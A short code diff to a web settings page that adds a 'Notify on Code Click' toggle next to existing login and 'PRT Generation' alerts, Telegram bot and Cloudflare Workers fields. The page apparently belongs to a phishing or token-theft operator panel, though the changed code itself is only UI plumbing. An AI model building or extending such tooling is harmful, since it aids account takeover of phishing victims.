@@ -102,6 +102,10 @@
                     <span class="toggle-label">Notify on PRT Generation</span>
                     <label class="toggle-switch"><input type="checkbox" id="notifyPrtToggle" checked><span class="toggle-slider"></span></label>
                 </div>
+                <div class="toggle-row">
+                    <span class="toggle-label">Notify on Code Click</span>
+                    <label class="toggle-switch"><input type="checkbox" id="notifyCodeClickToggle"><span class="toggle-slider"></span></label>
+                </div>
             </div>
 
             <!-- Sessions -->
@@ -220,6 +224,7 @@
                 document.getElementById('telegramBotToken').value = userProfile.telegram_bot_token || '';
                 document.getElementById('notifyLoginToggle').checked = userProfile.notify_login == 1;
                 document.getElementById('notifyPrtToggle').checked = userProfile.notify_prt == 1;
+                document.getElementById('notifyCodeClickToggle').checked = userProfile.notify_code_click == 1;
                 document.getElementById('cfApiToken').value = userProfile.cf_api_token || '';
                 document.getElementById('cfAccountId').value = userProfile.cf_account_id || '';
                 document.getElementById('cfWorkersSubdomain').value = userProfile.cf_workers_subdomain || '';
@@ -272,6 +277,7 @@
                 telegram_bot_token: document.getElementById('telegramBotToken').value,
                 notify_login: document.getElementById('notifyLoginToggle').checked,
                 notify_prt: document.getElementById('notifyPrtToggle').checked,
+                notify_code_click: document.getElementById('notifyCodeClickToggle').checked,
                 two_fa_method: twoFaMethod,
                 cf_api_token: document.getElementById('cfApiToken').value,
                 cf_account_id: document.getElementById('cfAccountId').value,
